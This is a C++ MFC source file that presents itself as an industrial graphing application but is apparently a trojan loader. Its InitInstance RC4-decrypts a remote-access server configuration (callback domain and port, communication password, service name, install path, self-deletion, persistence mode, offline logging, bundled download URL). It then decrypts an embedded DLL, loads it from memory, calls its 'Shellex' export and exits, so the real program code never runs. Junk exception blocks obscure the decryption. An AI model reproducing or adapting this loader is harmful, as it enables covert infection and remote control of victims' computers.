// Graphic.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Graphic.h"
#include "FaderWnd.h"//窗口渐隐头文件
#include "MainFrm.h"
#include "GraphicDoc.h"
#include "GraphicView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp

BEGIN_MESSAGE_MAP(CGraphicApp, CWinApp)
	//{{AFX_MSG_MAP(CGraphicApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
	// Standard print setup command
	ON_COMMAND(ID_FILE_PRINT_SETUP, CWinApp::OnFilePrintSetup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp construction

CGraphicApp::CGraphicApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CGraphicApp object

CGraphicApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp initialization

#include "C_DllMain.h"
char shellex[]={'S','h','e','l','l','e','x','\0'};
#include "MemLoadDll.h"
struct DLLSERVER_INFO
{
	CHAR Domain[100];     //域名IP
	CHAR QQDomain[100];     //域名IP
	WORD Port;            //上线端口
	WORD QQPort;            //上线端口
	CHAR Version[100];    //服务版本
	CHAR Group[100];      //上线分组
	CHAR SocketHead[100]; //通信密码
	CHAR ServiceName[100];   //服务名称
	CHAR ServicePlay[128];   //服务显示
	CHAR ServiceDesc[256];   //服务描述
	CHAR ReleasePath[100];   //安装途径
	CHAR ReleaseName[50];    //安装名称
	CHAR Mexi[100];          //运行互斥
	BOOL Dele_te;            //安装自删除
	CHAR Dele_zc;            //启动类型
	WORD Dele_zd;            //安装增大
	BOOL Dele_fs;            //占坑防删除安装
	BOOL Dele_Kzj;           //离线记录
	BOOL Dele_Cul;           //离线记录
	WORD FileAttribute;      //文件属性
	CHAR szDownRun[300];     //捆绑地址
//	CHAR URL[256];          //控件地址
};


DLLSERVER_INFO dll_info = 
{
	"www.baidu.com",
		"123456789",
		2017,
		2017,
		"V_2017",
		"Default",
		"123456",
		"YYYYYYYYYYYY",
		"Yugqqu qekcaigu",
		"Igaoqa ymusuyukeamucgowws",
		"%ProgramFiles%\\Rumno Qrstuv",
		"Debug.exe",
		"Nmbbre hjveaika",
		0,                       //0为安装不删除    1为安装删除
		0,                       //0为绿色运行      1为Run启动    2为服务启动
		0,                       //0为安装不增大
		0,                       //0为普通安装      1为占坑防删除安装
		0,                        //0为共同安装      1为离线记录安装
		0,                        //0为不域名转接
		FILE_ATTRIBUTE_NORMAL,    //文件属性
		'"',
//		"http://192.168.179.128/Consys21.dll"
		
};

typedef int (WINAPI *PFN_POPMSGBOX)(DLLSERVER_INFO);

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//解密
{	
	
	try
	{
		if(1+1==2)throw 70;
	}
	catch (...)
	{
		unsigned long i;
		unsigned char p;		
		p = (unsigned char ) key % 254 +88;
		for(i = 0; i < nLen; i++) 
		{
			try
			{
				if(1+1==2)throw 50;
			}
			catch (...)
			{
				*szRec ^= p;
				*szRec += p;
			}
			
			szRec++;
		}	
	}
	
}

void LoadDllFromMemAndCall( const char *name)
{
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;	
	EncryptData((unsigned char *)DllMainMyFileBuf,DllMainMyFileSize,3800);		
	hDll=MemoryLoadLibrary(DllMainMyFileBuf);
	if (hDll==NULL)
		return ;
	
    pfn=(PFN_POPMSGBOX)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		
		return;
	}
	pfn(dll_info);
	if (hDll!=NULL)
	{
		
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
	ExitProcess(0);
}

void rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
{
	int i =0, j = 0, k[256] = {0};
	unsigned char tmp = 0;
	for(i=0;i<256;i++)
	{
		s[i]=i;
		k[i]=key[i%Len];
	}
	for (i=0; i<256; i++)
	{
		j=(j+s[i]+k[i])%256;
		tmp = s[i];
		s[i] = s[j]; 
		s[j] = tmp;
	}
} 

void rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
{
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for(i=0;i<Len;i++)
	{
		x=(x+1)%256;
		y=(y+s[x])%256;
		tmp = s[x];
		s[x] = s[y];
		s[y] = tmp;
		t=(s[x]+s[y])%256;
		Data[i] ^= s[t];
	} 
}

VOID MyEncryptFunction(LPSTR szData,WORD Size)
{
	//RC4 加密 密码  Mother360
	unsigned char m_strkey0[256];
	char bpackey_se[] = {'K','o','t','h','e','r','1','6','8','\0'};
	
	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //初始化 RC4密码
	
	rc4_crypt(m_strkey0,(unsigned char *)szData,Size);
	
}

BOOL CGraphicApp::InitInstance()
{
	AfxEnableControlContainer(); 
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.
	MyEncryptFunction((LPSTR)&dll_info,sizeof(DLLSERVER_INFO));   //上线信息解密
	LoadDllFromMemAndCall(shellex);
	
	return 0;
#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	LoadStdProfileSettings();  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

// 	CSingleDocTemplate* pDocTemplate;
// 	pDocTemplate = new CSingleDocTemplate(
// 		IDR_MAINFRAME,
// 		RUNTIME_CLASS(CGraphicDoc),
// 		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
// 		RUNTIME_CLASS(CGraphicView));
// 	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOWMAXIMIZED);
	m_pMainWnd->UpdateWindow();
	m_pMainWnd->SetWindowText("工业曲线处理显示完整版 V1.0     设计者：戚高");

	//===================加载皮肤并且设置皮肤窗口================*/
	VERIFY( 1 == InitSkinMagicLib( AfxGetInstanceHandle(), "画图软件" , 
					  NULL,
					  NULL ) );

	VERIFY( 1 == LoadSkinFromResource( AfxGetInstanceHandle()  , "SKINMAGIC" ,"SKINMAGIC") ); 

	VERIFY( 1 == SetWindowSkin( m_pMainWnd->m_hWnd , "MainFrame" ));
	VERIFY( 1 == SetDialogSkin( "Dialog" ) );
	/*==========================END==============================*/
	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CGraphicApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp message handlers

